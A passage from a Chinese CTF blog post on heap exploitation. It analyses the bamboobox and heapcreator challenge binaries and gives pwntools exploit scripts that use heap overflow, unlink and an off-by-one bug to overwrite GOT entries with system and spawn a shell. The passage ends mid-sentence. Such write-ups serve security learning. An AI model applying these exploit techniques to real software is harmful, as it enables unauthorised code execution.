%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span>byte_401089<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>show功能根据num索引寻找对应的chunk，然后输出对的chunk编号和内容</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//change</span><span class="token keyword">if</span> <span class="token punctuation">(</span> num <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the index of item:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v2 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the length of item name:"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nptr<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v0 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>nptr<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the new name of the item:"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nptr<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invaild index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No item in the box"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><p>问题就出在change功能上<br>输入neme的长度的时候并没有判断是否大于之前的长度，造成了堆溢出漏洞</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//rmeove_item</span><span class="token keyword">if</span> <span class="token punctuation">(</span> num <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the index of item:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>      itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"remove successful!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">--</span>num<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invaild index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No item in the box"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><p>remove功能做的挺好的，该置null也都置null了</p><p>函数分析完了，接着就来构思如何利用<br>还是先封装一波函数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> length<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">remove</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span></code></pre><p>既然有严重的堆溢出漏洞，我们就可以任意构造堆，满足unlink的利用条件<br>先malloc三个chunk</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#要用来溢出的chunk  chunk0</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#victim chunk      chunk1</span>add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#防止上面的chunk free之后和top chunk合并  chunk2</span></code></pre><p>看一下此时的堆结构<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/13.jpg" alt=""><br>接着我们开始构造fakechunk<br>我们的目的是溢出到chunk1的pre_size和size位，除去chunk0的header，我们至少要编辑0x40-0x10+0x10=0x40大小</p><pre class=" language-python"><code class="language-python">fake_chunk<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#pre_size</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#size</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x18</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fd</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#bk</span>fake_chunk<span class="token operator">+=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x20</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fakechunk size</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#chunk1 size,并且标记fakechunk为空闲状态</span>change<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>fake_chunk<span class="token punctuation">)</span></code></pre><p>其中ptr=0x6020c8,即chunk0的指针的地址<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/14.jpg" alt=""><br>我们的fakechunk已经构造好了</p><p>接下来就是unlink了，当我们free掉chunk1，系统会检测到fakechunk也是空闲状态，就会将它一并free，最终结果就是原本应该指向fakechunk的指针P指向了&amp;ptr-8的位置，我们查看一下<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/15.jpg" alt=""><br>确实如我们预料一样，接下来我们编辑chunk0的话，其实是在编辑0x6020b0的内存<br>我们再来泄露libc基地址</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>我们看看change之前的0x6020b0处的内存<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/17.jpg" alt=""><br>change之后的<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/18.jpg" alt=""><br>如如上标注的，我们需要伪造chunk0，否则无法绕过检查<br>然后我们打印出chunk0的内容，即atoi的的地址，根据这个我们可以计算出libc基地址和system函数地址，接着，我们再次编辑chunk0，将<code>elf.got['atoi']</code>替换成<code>system@got</code>，这样一来，只要我们再输入一个<code>sh</code>，atoi(sh)就变成了system(sh),即可getshell<br>完整exp如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bamboobox'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io=remote("node3.buuoj.cn",28938)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'bamboobox'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> length<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">remove</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>ptr<span class="token operator">=</span><span class="token number">0x6020c8</span>add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>fake_chunk<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#pre_size</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#size</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x18</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fd</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#bk</span>fake_chunk<span class="token operator">+=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x20</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>fake_chunk<span class="token punctuation">)</span>remove<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0 : "</span><span class="token punctuation">)</span>atoi <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> atoi <span class="token operator">-</span> <span class="token number">0x36e80</span><span class="token keyword">print</span> <span class="token string">"libc:"</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>system <span class="token operator">=</span> libc <span class="token operator">+</span> <span class="token number">0x45390</span>change<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h2><p>fastbin attack是利用fastbin分配原理的漏洞，要求有堆溢出漏洞，通常情况下与double free、use after free和chunk extend连用<br>详细的讲解可以看看<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698" target="_blank" rel="noopener">breezeO_o</a>师傅的文章，讲的很详细，我这里就记录一下我做的两道题</p><h3 id="heapcreator"><a href="#heapcreator" class="headerlink" title="heapcreator"></a>heapcreator</h3><p>checksec<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/19.jpg" alt=""><br>64位文件，可以复写got表<br>运行一下<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/20.jpg" alt=""><br>增删查改，没毛病<br>IDA分析<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/21.jpg" alt=""><br>main函数利用switch选择功能<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/22.jpg" alt=""><br>分析create功能<br>最大能创建十次<br>然后会先malloc一个0x10(实际为0x20)大小的chunk(称之为heap)，其指针存入heaparray数组中<br>接下来分配用户指定大小的chunk(content)，其size存入heap数据段的第一个八字节中(即fd位)，content的指针存入heap的第二个八字节当中(即bk位)<br>heap结构如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> heap <span class="token punctuation">{</span>    size_t size <span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>content <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/23.jpg" alt=""><br>分析edit功能<br>根据index寻找chunk<br>如果存在则可以编辑<br>但读入content的时候存在off-by-one漏洞，如图所示<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/24.jpg" alt=""><br>这导致我们可以修改下一个chunk的size位<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/25.jpg" alt=""><br>分析show功能<br>同样根据index寻找chunk，如果对应的heaparray存在则输出size和content<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/26.jpg" alt=""><br>最后分析delete功能<br>delete功能没有什么问题，free的同时将指针置0</p><p>根据上面的分析，程序存在的漏洞存在于edit<br>先锋装一下函数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>思考一下如何getshell，程序只开启了Partial RELRO，那么可以将free@got修改成system@got，再够造出一个内容为/bin/sh的chunk，将其free即可<br>那么我们先创建2个chunk(实际上一共创建了4个)</p><pre class=" language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span></code></pre><p>此时堆结构如下<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/27.jpg" alt=""><br>我们将第一个content赋值为/bin/sh，并且通过溢出将下面两个chunk合并为一个</p><pre class=" language-python"><code class="language-python">edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>堆结构如下<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/28.jpg" alt=""><br>可以看到我们成功的将heap[1]的大小修改成了heap[1]+content[1]<br>我们delete掉heap[1]，就将content一起free掉了，fastbin中就存在了一个0x20大小和0x40大小的chunk。之后我们再申请一个大小为0x30(实际为0x40)的chunk，首先会malloc一个0x20大小的chunk作为heap，这样原本作为old content[1]的chunk就被分配给了new heap[1],而分配给new content[1]的0x40大小的chunk则包含了old heap[1]+old content[1],也就是说，我们可以通过控制new content[1]来修改new 